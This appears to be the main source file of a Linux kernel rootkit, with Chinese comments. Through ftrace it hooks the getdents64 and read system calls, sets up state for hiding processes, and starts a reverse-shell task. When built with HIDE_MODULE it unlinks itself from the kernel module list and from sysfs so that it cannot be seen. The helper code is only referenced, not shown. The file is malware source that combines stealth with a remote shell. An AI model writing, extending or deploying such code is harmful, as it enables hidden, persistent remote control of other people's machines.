#include <linux/module.h>
#include <linux/init.h>
#include <linux/kobject.h>

#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"
#include "hooks/x64_sys_read.h"

#include "tasks/task_manager.h"
#include "tasks/reverse_shell.h"

#include "core/proc_state.h"
#include "core/lifecycle.h"   // 新增生命周期管理

// define which tasks to run
static struct k_task tasks[] = {
    {&rshell_func, NULL},
};

// define which functions to hook
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init mode_init(void) {
    int err;

    /* 初始化进程隐藏状态管理 */
    err = proc_state_init();
    if (err) {
        pr_err("proc_state_init failed: %d\n", err);
        return err;
    }

    /* 注册 fork/exec/exit hook */
    err = lifecycle_init();
    if (err) {
        pr_err("lifecycle_init failed: %d\n", err);
        proc_state_cleanup();
        return err;
    }

    /* 安装 ftrace hook */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("fh_install_hooks failed: %d\n", err);
        lifecycle_cleanup();
        proc_state_cleanup();
        return err;
    }

    /* 启动自定义任务 */
    err = run_tasks(tasks, ARRAY_SIZE(tasks));
    if (err) {
        pr_err("run_tasks failed: %d\n", err);
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        lifecycle_cleanup();
        proc_state_cleanup();
        return err;
    }

#ifdef HIDE_MODULE
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

    pr_info("mode module loaded successfully\n");
    return 0;
}

static void __exit mode_exit(void) {
    /* 停止自定义任务 */
    stop_tasks(tasks, ARRAY_SIZE(tasks));

    /* 移除 ftrace hook */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    /* 注销生命周期 hook */
    lifecycle_cleanup();

    /* 清理 proc_state 哈希表 */
    proc_state_cleanup();

    pr_info("mode module unloaded successfully\n");
}

module_init(mode_init);
module_exit(mode_exit);
MODULE_LICENSE("GPL");
